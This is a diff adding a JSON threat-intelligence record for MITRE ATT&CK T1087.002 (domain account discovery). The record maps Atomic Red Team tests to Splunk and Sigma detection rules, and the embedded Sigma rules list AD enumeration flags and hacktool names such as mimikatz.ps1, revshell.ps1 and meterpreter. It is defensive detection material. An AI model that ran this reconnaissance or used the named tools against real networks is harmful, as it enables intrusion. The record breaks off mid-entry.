@@ -1,0 +1,1015 @@
+{
+    "id": "T1087.002",
+    "name": "Domain Account",
+    "description": "Adversaries may attempt to get a listing of domain accounts. This information can help adversaries determine which domain accounts exist to aid in follow-on behavior.\nCommands such as `net user /domain` and `net group /domain` of the [Net](S0039) utility, `dscacheutil -q group`on macOS, and `ldapsearch` on Linux can list domain users and groups.",
+    "platforms": "Linux, macOS, Windows",
+    "kill_chain_phases": "Discovery",
+    "data_sources": "Process: Process Creation, Command: Command Execution",
+    "detection": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](T1047) and [PowerShell](T1059.001).",
+    "url": "https://attack.mitre.org/techniques/T1087/002",
+    "enrichments": {
+        "attack_rule_map": [
+            {
+                "tech_id": "T1087.002",
+                "atomic_attack_guid": "ffbcfd62-15d6-4989-a21a-80bfc8e58bb5",
+                "atomic_attack_name": "Suspicious LAPS Attributes Query with Get-ADComputer all properties and SearchScope",
+                "platform": "Windows",
+                "splunk_rules": [
+                    {
+                        "rule_name": "GetAdComputer with PowerShell",
+                        "rule_link": "https://research.splunk.com/endpoint/c5a31f80-5888-4d81-9f78-1cc65026316e/"
+                    }
+                ]
+            },
+            {
+                "tech_id": "T1087.002",
+                "atomic_attack_guid": "6e85bdf9-7bc4-4259-ac0f-f0cb39964443",
+                "atomic_attack_name": "Suspicious LAPS Attributes Query with Get-ADComputer ms-Mcs-AdmPwd property",
+                "platform": "Windows",
+                "splunk_rules": [
+                    {
+                        "rule_name": "GetAdComputer with PowerShell",
+                        "rule_link": "https://research.splunk.com/endpoint/c5a31f80-5888-4d81-9f78-1cc65026316e/"
+                    }
+                ]
+            },
+            {
+                "tech_id": "T1087.002",
+                "atomic_attack_guid": "394012d9-2164-4d4f-b9e5-acf30ba933fe",
+                "atomic_attack_name": "Suspicious LAPS Attributes Query with Get-ADComputer all properties",
+                "platform": "Windows",
+                "splunk_rules": [
+                    {
+                        "rule_name": "GetAdComputer with PowerShell",
+                        "rule_link": "https://research.splunk.com/endpoint/c5a31f80-5888-4d81-9f78-1cc65026316e/"
+                    }
+                ]
+            },
+            {
+                "tech_id": "T1087.002",
+                "atomic_attack_guid": "c70ab9fd-19e2-4e02-a83c-9cfa8eaa8fef",
+                "atomic_attack_name": "Enumerate Default Domain Admin Details (Domain)",
+                "platform": "Windows",
+                "sigma_rules": [
+                    {
+                        "rule_name": "Suspicious Manipulation Of Default Accounts Via Net.EXE",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_net_user_default_accounts_manipulation.yml",
+                        "remote_content": "title: Suspicious Manipulation Of Default Accounts Via Net.EXE\nid: 5b768e71-86f2-4879-b448-81061cbae951\nstatus: test\ndescription: Detects suspicious manipulations of default accounts such as 'administrator' and 'guest'. For example 'enable' or 'disable' accounts or change the password...etc\nreferences:\n    - https://www.trellix.com/en-sg/about/newsroom/stories/threat-labs/lockergoga-ransomware-family-used-in-targeted-attacks.html\n    - https://redacted.com/blog/bianlian-ransomware-gang-gives-it-a-go/\n    - https://www.microsoft.com/security/blog/2022/09/07/profiling-dev-0270-phosphorus-ransomware-operations/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-09-01\nmodified: 2023-02-21\ntags:\n    - attack.collection\n    - attack.t1560.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith:\n              - '\\net.exe'\n              - '\\net1.exe'\n        - OriginalFileName:\n              - 'net.exe'\n              - 'net1.exe'\n    selection_user_option:\n        CommandLine|contains: ' user '\n    selection_username:\n        CommandLine|contains:\n            # Note: We need to write the full account name for cases starting with 'admin' to avoid lookups only with the user flag\n            - ' Järjestelmänvalvoja ' # Finish\n            - ' Rendszergazda ' # Hungarian\n            - ' Администратор ' # Russian\n            - ' Administrateur ' # French\n            - ' Administrador ' # Portuguese (Brazil + Portugal) + Spanish\n            - ' Administratör ' # Swedish\n            - ' Administrator ' # English\n            - ' guest '\n            - ' DefaultAccount '\n            # The cases below are for when an attacker requests the net command via 'cmd /c....'\n            # First in double quotes\n            - ' \"Järjestelmänvalvoja\" ' # Finish\n            - ' \"Rendszergazda\" ' # Hungarian\n            - ' \"Администратор\" ' # Russian\n            - ' \"Administrateur\" ' # French\n            - ' \"Administrador\" ' # Portuguese (Brazil + Portugal) + Spanish\n            - ' \"Administratör\" ' # Swedish\n            - ' \"Administrator\" ' # English\n            - ' \"guest\" '\n            - ' \"DefaultAccount\" '\n            # Second in single quotes\n            - \" 'Järjestelmänvalvoja' \" # Finish\n            - \" 'Rendszergazda' \" # Hungarian\n            - \" 'Администратор' \" # Russian\n            - \" 'Administrateur' \" # French\n            - \" 'Administrador' \" # Portuguese (Brazil + Portugal) + Spanish\n            - \" 'Administratör' \" # Swedish\n            - \" 'Administrator' \" # English\n            - \" 'guest' \"\n            - \" 'DefaultAccount' \"\n    filter:\n        CommandLine|contains|all:\n            - 'guest'\n            - '/active no'\n    condition: all of selection_* and not filter\nfalsepositives:\n    - Some false positives could occur with the admin or guest account. It depends on the scripts being used by the admins in your env. If you experience a lot of FP you could reduce the level to medium\nlevel: high\n"
+                    }
+                ],
+                "splunk_rules": [
+                    {
+                        "rule_name": "Account Discovery With Net App",
+                        "rule_link": "https://research.splunk.com/endpoint/339805ce-ac30-11eb-b87d-acde48001122/"
+                    },
+                    {
+                        "rule_name": "Domain Account Discovery With Net App",
+                        "rule_link": "https://research.splunk.com/endpoint/98f6a534-04c2-11ec-96b2-acde48001122/"
+                    },
+                    {
+                        "rule_name": "Network Connection Discovery With Net",
+                        "rule_link": "https://research.splunk.com/endpoint/640337e5-6e41-4b7f-af06-9d9eab5e1e2d/"
+                    }
+                ]
+            },
+            {
+                "tech_id": "T1087.002",
+                "atomic_attack_guid": "e1ec8d20-509a-4b9a-b820-06c9b2da8eb7",
+                "atomic_attack_name": "Adfind - Enumerate Active Directory User Objects",
+                "platform": "Windows",
+                "sigma_rules": [
+                    {
+                        "rule_name": "PUA - AdFind Suspicious Execution",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_pua_adfind_susp_usage.yml",
+                        "remote_content": "title: PUA - AdFind Suspicious Execution\nid: 9a132afa-654e-11eb-ae93-0242ac130002\nrelated:\n    - id: 455b9d50-15a1-4b99-853f-8d37655a4c1b\n      type: similar\n    - id: 75df3b17-8bcc-4565-b89b-c9898acef911\n      type: obsolete\nstatus: test\ndescription: Detects AdFind execution with common flags seen used during attacks\nreferences:\n    - https://www.joeware.net/freetools/tools/adfind/\n    - https://thedfirreport.com/2020/05/08/adfind-recon/\n    - https://thedfirreport.com/2021/01/11/trickbot-still-alive-and-well/\n    - https://www.microsoft.com/security/blog/2021/01/20/deep-dive-into-the-solorigate-second-stage-activation-from-sunburst-to-teardrop-and-raindrop/\n    - https://social.technet.microsoft.com/wiki/contents/articles/7535.adfind-command-examples.aspx\n    - https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/bf62ece1c679b07b5fb49c4bae947fe24c81811f/fin6/Emulation_Plan/Phase1.md\n    - https://github.com/redcanaryco/atomic-red-team/blob/0f229c0e42bfe7ca736a14023836d65baa941ed2/atomics/T1087.002/T1087.002.md#atomic-test-7---adfind---enumerate-active-directory-user-objects\nauthor: Janantha Marasinghe (https://github.com/blueteam0ps), FPT.EagleEye Team, omkar72, oscd.community\ndate: 2021-02-02\nmodified: 2023-03-05\ntags:\n    - attack.discovery\n    - attack.t1018\n    - attack.t1087.002\n    - attack.t1482\n    - attack.t1069.002\n    - stp.1u\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            - 'domainlist'\n            - 'trustdmp'\n            - 'dcmodes'\n            - 'adinfo'\n            - ' dclist '\n            - 'computer_pwdnotreqd'\n            - 'objectcategory='\n            - '-subnets -f'\n            - 'name=\"Domain Admins\"'\n            - '-sc u:'\n            - 'domainncs'\n            - 'dompol'\n            - ' oudmp '\n            - 'subnetdmp'\n            - 'gpodmp'\n            - 'fspdmp'\n            - 'users_noexpire'\n            - 'computers_active'\n            - 'computers_pwdnotreqd'\n    condition: selection\nfalsepositives:\n    - Legitimate admin activity\nlevel: high\n"
+                    }
+                ],
+                "splunk_rules": [
+                    {
+                        "rule_name": "Windows AdFind Exe",
+                        "rule_link": "https://research.splunk.com/endpoint/bd3b0187-189b-46c0-be45-f52da2bae67f/"
+                    }
+                ]
+            },
+            {
+                "tech_id": "T1087.002",
+                "atomic_attack_guid": "161dcd85-d014-4f5e-900c-d3eaae82a0f7",
+                "atomic_attack_name": "Enumerate logged on users via CMD (Domain)",
+                "platform": "Windows",
+                "splunk_rules": [
+                    {
+                        "rule_name": "System User Discovery With Query",
+                        "rule_link": "https://research.splunk.com/endpoint/ad03bfcf-8a91-4bc2-a500-112993deba87/"
+                    }
+                ]
+            },
+            {
+                "tech_id": "T1087.002",
+                "atomic_attack_guid": "6fbc9e68-5ad7-444a-bd11-8bf3136c477e",
+                "atomic_attack_name": "Enumerate all accounts (Domain)",
+                "platform": "Windows",
+                "sigma_rules": [
+                    {
+                        "rule_name": "Net.EXE Execution",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules-threat-hunting/windows/process_creation/proc_creation_win_net_execution.yml",
+                        "remote_content": "title: Net.EXE Execution\nid: 183e7ea8-ac4b-4c23-9aec-b3dac4e401ac\nstatus: test\ndescription: Detects execution of \"Net.EXE\".\nreferences:\n    - https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/\n    - https://eqllib.readthedocs.io/en/latest/analytics/4d2e7fc1-af0b-4915-89aa-03d25ba7805e.html\n    - https://eqllib.readthedocs.io/en/latest/analytics/e61f557c-a9d0-4c25-ab5b-bbc46bb24deb.html\n    - https://eqllib.readthedocs.io/en/latest/analytics/9b3dd402-891c-4c4d-a662-28947168ce61.html\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1007/T1007.md#atomic-test-2---system-service-discovery---netexe\nauthor: Michael Haag, Mark Woan (improvements), James Pemberton / @4A616D6573 / oscd.community (improvements)\ndate: 2019-01-16\nmodified: 2022-07-11\ntags:\n    - attack.discovery\n    - attack.t1007\n    - attack.t1049\n    - attack.t1018\n    - attack.t1135\n    - attack.t1201\n    - attack.t1069.001\n    - attack.t1069.002\n    - attack.t1087.001\n    - attack.t1087.002\n    - attack.lateral-movement\n    - attack.t1021.002\n    - attack.s0039\n    - detection.threat-hunting\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith:\n              - '\\net.exe'\n              - '\\net1.exe'\n        - OriginalFileName:\n              - 'net.exe'\n              - 'net1.exe'\n    selection_cli:\n        CommandLine|contains:\n            - ' accounts'\n            - ' group'\n            - ' localgroup'\n            - ' share'\n            - ' start'\n            - ' stop '\n            - ' user'\n            - ' view'\n    condition: all of selection_*\nfalsepositives:\n    - Likely\nlevel: low\n"
+                    },
+                    {
+                        "rule_name": "Suspicious Group And Account Reconnaissance Activity Using Net.EXE",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_net_groups_and_accounts_recon.yml",
+                        "remote_content": "title: Suspicious Group And Account Reconnaissance Activity Using Net.EXE\nid: d95de845-b83c-4a9a-8a6a-4fc802ebf6c0\nstatus: test\ndescription: |\n    Detects suspicious reconnaissance command line activity on Windows systems using Net.EXE\n    Check if the user that executed the commands is suspicious (e.g. service accounts, LOCAL_SYSTEM)\nreferences:\n    - https://redcanary.com/blog/how-one-hospital-thwarted-a-ryuk-ransomware-outbreak/\n    - https://thedfirreport.com/2020/10/18/ryuk-in-5-hours/\n    - https://research.nccgroup.com/2022/08/19/back-in-black-unlocking-a-lockbit-3-0-ransomware-attack/\nauthor: Florian Roth (Nextron Systems), omkar72, @svch0st, Nasreddine Bencherchali (Nextron Systems)\ndate: 2019-01-16\nmodified: 2023-03-02\ntags:\n    - attack.discovery\n    - attack.t1087.001\n    - attack.t1087.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith:\n              - '\\net.exe'\n              - '\\net1.exe'\n        - OriginalFileName:\n              - 'net.exe'\n              - 'net1.exe'\n    # Covers group and localgroup flags\n    selection_group_root:\n        CommandLine|contains:\n            - ' group '\n            - ' localgroup '\n    selection_group_flags:\n        CommandLine|contains:\n            # Add more groups for other languages\n            - 'domain admins'\n            - ' administrator' # Typo without an 'S' so we catch both\n            - ' administrateur' # Typo without an 'S' so we catch both\n            - 'enterprise admins'\n            - 'Exchange Trusted Subsystem'\n            - 'Remote Desktop Users'\n            - 'Utilisateurs du Bureau à distance' # French for \"Remote Desktop Users\"\n            - 'Usuarios de escritorio remoto' # Spanish for \"Remote Desktop Users\"\n            - ' /do' # short for domain\n    filter_group_add:\n        # This filter is added to avoid the potential case where the point is not recon but addition\n        CommandLine|contains: ' /add'\n    # Covers 'accounts' flag\n    selection_accounts_root:\n        CommandLine|contains: ' accounts '\n    selection_accounts_flags:\n        CommandLine|contains: ' /do' # short for domain\n    condition: selection_img and ((all of selection_group_* and not filter_group_add) or all of selection_accounts_*)\nfalsepositives:\n    - Inventory tool runs\n    - Administrative activity\nlevel: medium\n"
+                    }
+                ],
+                "splunk_rules": [
+                    {
+                        "rule_name": "Domain Group Discovery With Net",
+                        "rule_link": "https://research.splunk.com/endpoint/f2f14ac7-fa81-471a-80d5-7eb65c3c7349/"
+                    }
+                ]
+            },
+            {
+                "tech_id": "T1087.002",
+                "atomic_attack_guid": "7ab0205a-34e4-4a44-9b04-e1541d1a57be",
+                "atomic_attack_name": "Enumerate Linked Policies In ADSISearcher Discovery",
+                "platform": "Windows",
+                "sigma_rules": [
+                    {
+                        "rule_name": "PUA - AdFind Suspicious Execution",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_pua_adfind_susp_usage.yml",
+                        "remote_content": "title: PUA - AdFind Suspicious Execution\nid: 9a132afa-654e-11eb-ae93-0242ac130002\nrelated:\n    - id: 455b9d50-15a1-4b99-853f-8d37655a4c1b\n      type: similar\n    - id: 75df3b17-8bcc-4565-b89b-c9898acef911\n      type: obsolete\nstatus: test\ndescription: Detects AdFind execution with common flags seen used during attacks\nreferences:\n    - https://www.joeware.net/freetools/tools/adfind/\n    - https://thedfirreport.com/2020/05/08/adfind-recon/\n    - https://thedfirreport.com/2021/01/11/trickbot-still-alive-and-well/\n    - https://www.microsoft.com/security/blog/2021/01/20/deep-dive-into-the-solorigate-second-stage-activation-from-sunburst-to-teardrop-and-raindrop/\n    - https://social.technet.microsoft.com/wiki/contents/articles/7535.adfind-command-examples.aspx\n    - https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/bf62ece1c679b07b5fb49c4bae947fe24c81811f/fin6/Emulation_Plan/Phase1.md\n    - https://github.com/redcanaryco/atomic-red-team/blob/0f229c0e42bfe7ca736a14023836d65baa941ed2/atomics/T1087.002/T1087.002.md#atomic-test-7---adfind---enumerate-active-directory-user-objects\nauthor: Janantha Marasinghe (https://github.com/blueteam0ps), FPT.EagleEye Team, omkar72, oscd.community\ndate: 2021-02-02\nmodified: 2023-03-05\ntags:\n    - attack.discovery\n    - attack.t1018\n    - attack.t1087.002\n    - attack.t1482\n    - attack.t1069.002\n    - stp.1u\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            - 'domainlist'\n            - 'trustdmp'\n            - 'dcmodes'\n            - 'adinfo'\n            - ' dclist '\n            - 'computer_pwdnotreqd'\n            - 'objectcategory='\n            - '-subnets -f'\n            - 'name=\"Domain Admins\"'\n            - '-sc u:'\n            - 'domainncs'\n            - 'dompol'\n            - ' oudmp '\n            - 'subnetdmp'\n            - 'gpodmp'\n            - 'fspdmp'\n            - 'users_noexpire'\n            - 'computers_active'\n            - 'computers_pwdnotreqd'\n    condition: selection\nfalsepositives:\n    - Legitimate admin activity\nlevel: high\n"
+                    }
+                ]
+            },
+            {
+                "tech_id": "T1087.002",
+                "atomic_attack_guid": "02e8be5a-3065-4e54-8cc8-a14d138834d3",
+                "atomic_attack_name": "Enumerate Active Directory Users with ADSISearcher",
+                "platform": "Windows",
+                "sigma_rules": [
+                    {
+                        "rule_name": "PUA - AdFind Suspicious Execution",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_pua_adfind_susp_usage.yml",
+                        "remote_content": "title: PUA - AdFind Suspicious Execution\nid: 9a132afa-654e-11eb-ae93-0242ac130002\nrelated:\n    - id: 455b9d50-15a1-4b99-853f-8d37655a4c1b\n      type: similar\n    - id: 75df3b17-8bcc-4565-b89b-c9898acef911\n      type: obsolete\nstatus: test\ndescription: Detects AdFind execution with common flags seen used during attacks\nreferences:\n    - https://www.joeware.net/freetools/tools/adfind/\n    - https://thedfirreport.com/2020/05/08/adfind-recon/\n    - https://thedfirreport.com/2021/01/11/trickbot-still-alive-and-well/\n    - https://www.microsoft.com/security/blog/2021/01/20/deep-dive-into-the-solorigate-second-stage-activation-from-sunburst-to-teardrop-and-raindrop/\n    - https://social.technet.microsoft.com/wiki/contents/articles/7535.adfind-command-examples.aspx\n    - https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/bf62ece1c679b07b5fb49c4bae947fe24c81811f/fin6/Emulation_Plan/Phase1.md\n    - https://github.com/redcanaryco/atomic-red-team/blob/0f229c0e42bfe7ca736a14023836d65baa941ed2/atomics/T1087.002/T1087.002.md#atomic-test-7---adfind---enumerate-active-directory-user-objects\nauthor: Janantha Marasinghe (https://github.com/blueteam0ps), FPT.EagleEye Team, omkar72, oscd.community\ndate: 2021-02-02\nmodified: 2023-03-05\ntags:\n    - attack.discovery\n    - attack.t1018\n    - attack.t1087.002\n    - attack.t1482\n    - attack.t1069.002\n    - stp.1u\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            - 'domainlist'\n            - 'trustdmp'\n            - 'dcmodes'\n            - 'adinfo'\n            - ' dclist '\n            - 'computer_pwdnotreqd'\n            - 'objectcategory='\n            - '-subnets -f'\n            - 'name=\"Domain Admins\"'\n            - '-sc u:'\n            - 'domainncs'\n            - 'dompol'\n            - ' oudmp '\n            - 'subnetdmp'\n            - 'gpodmp'\n            - 'fspdmp'\n            - 'users_noexpire'\n            - 'computers_active'\n            - 'computers_pwdnotreqd'\n    condition: selection\nfalsepositives:\n    - Legitimate admin activity\nlevel: high\n"
+                    }
+                ]
+            },
+            {
+                "tech_id": "T1087.002",
+                "atomic_attack_guid": "5e2938fb-f919-47b6-8b29-2f6a1f718e99",
+                "atomic_attack_name": "Adfind - Enumerate Active Directory Exchange AD Objects",
+                "platform": "Windows",
+                "sigma_rules": [
+                    {
+                        "rule_name": "PUA - Suspicious ActiveDirectory Enumeration Via AdFind.EXE",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_pua_adfind_enumeration.yml",
+                        "remote_content": "title: PUA - Suspicious ActiveDirectory Enumeration Via AdFind.EXE\nid: 455b9d50-15a1-4b99-853f-8d37655a4c1b\nrelated:\n    - id: 9a132afa-654e-11eb-ae93-0242ac130002\n      type: similar\nstatus: test\ndescription: Detects active directory enumeration activity using known AdFind CLI flags\nreferences:\n    - https://www.joeware.net/freetools/tools/adfind/\n    - https://social.technet.microsoft.com/wiki/contents/articles/7535.adfind-command-examples.aspx\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1087.002/T1087.002.md\nauthor: frack113\ndate: 2021-12-13\nmodified: 2023-03-05\ntags:\n    - attack.discovery\n    - attack.t1087.002\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_password: # Listing password policy\n        CommandLine|contains:\n            - lockoutduration\n            - lockoutthreshold\n            - lockoutobservationwindow\n            - maxpwdage\n            - minpwdage\n            - minpwdlength\n            - pwdhistorylength\n            - pwdproperties\n    selection_enum_ad: # Enumerate Active Directory Admins\n        CommandLine|contains: '-sc admincountdmp'\n    selection_enum_exchange: # Enumerate Active Directory Exchange AD Objects\n        CommandLine|contains: '-sc exchaddresses'\n    condition: 1 of selection_*\nfalsepositives:\n    - Authorized administrative activity\nlevel: high\n"
+                    }
+                ]
+            },
+            {
+                "tech_id": "T1087.002",
+                "atomic_attack_guid": "b95fd967-4e62-4109-b48d-265edfd28c3a",
+                "atomic_attack_name": "Adfind - Enumerate Active Directory Admins",
+                "platform": "Windows",
+                "sigma_rules": [
+                    {
+                        "rule_name": "PUA - Suspicious ActiveDirectory Enumeration Via AdFind.EXE",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_pua_adfind_enumeration.yml",
+                        "remote_content": "title: PUA - Suspicious ActiveDirectory Enumeration Via AdFind.EXE\nid: 455b9d50-15a1-4b99-853f-8d37655a4c1b\nrelated:\n    - id: 9a132afa-654e-11eb-ae93-0242ac130002\n      type: similar\nstatus: test\ndescription: Detects active directory enumeration activity using known AdFind CLI flags\nreferences:\n    - https://www.joeware.net/freetools/tools/adfind/\n    - https://social.technet.microsoft.com/wiki/contents/articles/7535.adfind-command-examples.aspx\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1087.002/T1087.002.md\nauthor: frack113\ndate: 2021-12-13\nmodified: 2023-03-05\ntags:\n    - attack.discovery\n    - attack.t1087.002\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_password: # Listing password policy\n        CommandLine|contains:\n            - lockoutduration\n            - lockoutthreshold\n            - lockoutobservationwindow\n            - maxpwdage\n            - minpwdage\n            - minpwdlength\n            - pwdhistorylength\n            - pwdproperties\n    selection_enum_ad: # Enumerate Active Directory Admins\n        CommandLine|contains: '-sc admincountdmp'\n    selection_enum_exchange: # Enumerate Active Directory Exchange AD Objects\n        CommandLine|contains: '-sc exchaddresses'\n    condition: 1 of selection_*\nfalsepositives:\n    - Authorized administrative activity\nlevel: high\n"
+                    }
+                ]
+            },
+            {
+                "tech_id": "T1087.002",
+                "atomic_attack_guid": "736b4f53-f400-4c22-855d-1a6b5a551600",
+                "atomic_attack_name": "Adfind -Listing password policy",
+                "platform": "Windows",
+                "sigma_rules": [
+                    {
+                        "rule_name": "PUA - Suspicious ActiveDirectory Enumeration Via AdFind.EXE",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_pua_adfind_enumeration.yml",
+                        "remote_content": "title: PUA - Suspicious ActiveDirectory Enumeration Via AdFind.EXE\nid: 455b9d50-15a1-4b99-853f-8d37655a4c1b\nrelated:\n    - id: 9a132afa-654e-11eb-ae93-0242ac130002\n      type: similar\nstatus: test\ndescription: Detects active directory enumeration activity using known AdFind CLI flags\nreferences:\n    - https://www.joeware.net/freetools/tools/adfind/\n    - https://social.technet.microsoft.com/wiki/contents/articles/7535.adfind-command-examples.aspx\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1087.002/T1087.002.md\nauthor: frack113\ndate: 2021-12-13\nmodified: 2023-03-05\ntags:\n    - attack.discovery\n    - attack.t1087.002\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_password: # Listing password policy\n        CommandLine|contains:\n            - lockoutduration\n            - lockoutthreshold\n            - lockoutobservationwindow\n            - maxpwdage\n            - minpwdage\n            - minpwdlength\n            - pwdhistorylength\n            - pwdproperties\n    selection_enum_ad: # Enumerate Active Directory Admins\n        CommandLine|contains: '-sc admincountdmp'\n    selection_enum_exchange: # Enumerate Active Directory Exchange AD Objects\n        CommandLine|contains: '-sc exchaddresses'\n    condition: 1 of selection_*\nfalsepositives:\n    - Authorized administrative activity\nlevel: high\n"
+                    }
+                ]
+            },
+            {
+                "tech_id": "T1087.002",
+                "atomic_attack_guid": "95018438-454a-468c-a0fa-59c800149b59",
+                "atomic_attack_name": "Automated AD Recon (ADRecon)",
+                "platform": "Windows",
+                "sigma_rules": [
+                    {
+                        "rule_name": "Suspicious Program Names",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_progname.yml",
+                        "remote_content": "title: Suspicious Program Names\nid: efdd8dd5-cee8-4e59-9390-7d4d5e4dd6f6\nstatus: test\ndescription: Detects suspicious patterns in program names or folders that are often found in malicious samples or hacktools\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1560.001/T1560.001.md\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-02-11\nmodified: 2023-03-22\ntags:\n    - attack.execution\n    - attack.t1059\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_image:\n        - Image|contains:\n              - '\\CVE-202' # Update this when we reach the year 2100\n              - '\\CVE202' # Update this when we reach the year 2100\n        - Image|endswith:\n              - '\\poc.exe'\n              - '\\artifact.exe'\n              - '\\artifact64.exe'\n              - '\\artifact_protected.exe'\n              - '\\artifact32.exe'\n              - '\\artifact32big.exe'\n              - 'obfuscated.exe'\n              - 'obfusc.exe'\n              - '\\meterpreter'\n    selection_commandline:\n        CommandLine|contains:\n            - 'inject.ps1'\n            - 'Invoke-CVE'\n            - 'pupy.ps1'\n            - 'payload.ps1'\n            - 'beacon.ps1'\n            - 'PowerView.ps1'\n            - 'bypass.ps1'\n            - 'obfuscated.ps1'\n            - 'obfusc.ps1'\n            - 'obfus.ps1'\n            - 'obfs.ps1'\n            - 'evil.ps1'\n            - 'MiniDogz.ps1'\n            - '_enc.ps1'\n            - '\\shell.ps1'\n            - '\\rshell.ps1'\n            - 'revshell.ps1'\n            - '\\av.ps1'\n            - '\\av_test.ps1'\n            - 'adrecon.ps1'\n            - 'mimikatz.ps1'\n            - '\\PowerUp_'\n            - 'powerup.ps1'\n            - '\\Temp\\a.ps1'\n            - '\\Temp\\p.ps1'\n            - '\\Temp\\1.ps1'\n            - 'Hound.ps1'\n            - 'encode.ps1'\n            - 'powercat.ps1'\n    condition: 1 of selection*\nfields:\n    - CommandLine\n    - ParentCommandLine\n    - CurrentDirectory\nfalsepositives:\n    - Legitimate tools that accidentally match on the searched patterns\nlevel: high\n"
+                    }
+                ]
+            }
+        ],
+        "cycat": {
+            "cycat": {
+                "cycat_related_uuids": [
+                    "ab6bffca-beff-4baa-af11-6733f296d57a",
+                    "0319b483-5973-4932-91ea-5a44c2975b24",
+                    "89819aa4-bbd6-46bc-88ec-c7f7fe30efa6",
+                    "83e15192-96d8-476c-aa39-0317de8dba80",
+                    "02773bed-83bf-469f-b7ff-e676e7d78bab",
+                    "9a132afa-654e-11eb-ae93-0242ac130002",
+                    "f376c8a7-a2d0-4ddc-aa0c-16c17236d962",
+                    "d95de845-b83c-4a9a-8a6a-4fc802ebf6c0",
+                    "968eef52-9cff-4454-8992-1e74b9cbad6c",
+                    "02030f2f-6199-49ec-b258-ea71b07e03dc",
+                    "21875073-b0ee-49e3-9077-1e2a885359af",
+                    "183e7ea8-ac4b-4c23-9aec-b3dac4e401ac",
+                    "35ba1d85-724d-42a3-889f-2e2362bcaf23",
+                    "df55196f-f105-44d3-a675-e9dfb6cc2f2b",
+                    "aae1243f-d8af-40d8-ab20-33fc6d0c55bc",
+                    "455b9d50-15a1-4b99-853f-8d37655a4c1b",
+                    "66a0bdc6-ee04-441a-9125-99d2eb547942",
+                    "31d68132-4038-47c7-8f8e-635a39a7c174",
+                    "619b020f-0fd7-4f23-87db-3f51ef837a34",
+                    "7d0d0329-0ef1-4e84-a9f5-49500f9d7c6c",
+                    "75df3b17-8bcc-4565-b89b-c9898acef911",
+                    "4bcf0465-4b53-4de4-8c53-fcc5f7d04dfc"
+                ],
+                "lookup_results": [
+                    {
+                        "uuid": "ab6bffca-beff-4baa-af11-6733f296d57a",
+                        "lookup_data": {
+                            "description": "Detects access to a domain user from a non-machine account",
+                            "raw": "author: Maxime Thiebaut (@0xThiebaut)\ndate: 2020/03/30\ndescription: Detects access to a domain user from a non-machine account\ndetection:\n  condition: selection and not filter\n  filter:\n  - SubjectUserName|endswith: $\n  - SubjectUserName|startswith: MSOL_\n  selection:\n    EventID: 4662\n    ObjectType|contains: bf967aba-0de6-11d0-a285-00aa003049e2\nfalsepositives:\n- Administrators configuring new users.\nid: ab6bffca-beff-4baa-af11-6733f296d57a\nlevel: medium\nlogsource:\n  definition: Requires the \"Read all properties\" permission on the user object to\n    be audited for the \"Everyone\" principal\n  product: windows\n  service: security\nmodified: 2022/10/09\nreferences:\n- https://www.specterops.io/assets/resources/an_ace_up_the_sleeve.pdf\n- http://www.stuffithoughtiknew.com/2019/02/detecting-bloodhound.html\n- https://docs.microsoft.com/en-us/windows/win32/adschema/attributes-all\nstatus: test\ntags:\n- attack.discovery\n- attack.t1087.002\ntitle: AD User Enumeration\n",
+                            "sigma:id": "ab6bffca-beff-4baa-af11-6733f296d57a",
+                            "title": "AD User Enumeration",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "0319b483-5973-4932-91ea-5a44c2975b24",
+                        "lookup_data": {
+                            "description": "Conti Ransomware",
